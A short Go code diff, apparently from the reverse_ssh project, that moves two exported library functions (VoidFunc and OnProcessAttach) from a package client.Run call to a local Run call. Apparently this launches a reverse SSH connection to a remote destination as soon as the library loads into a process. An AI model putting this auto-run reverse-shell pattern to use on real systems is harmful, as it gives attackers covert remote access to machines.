@@ -3,14 +3,14 @@
 package main
 
 import "C"
-import "github.com/NHAS/reverse_ssh/internal/client"
 
 //export VoidFunc
 func VoidFunc() {
-	client.Run(destination, fingerprint, "")
+	Run(destination, fingerprint, "")
 }
 
 //export OnProcessAttach
 func OnProcessAttach() {
-	client.Run(destination, fingerprint, "")
+
+	Run(destination, fingerprint, "")
 }
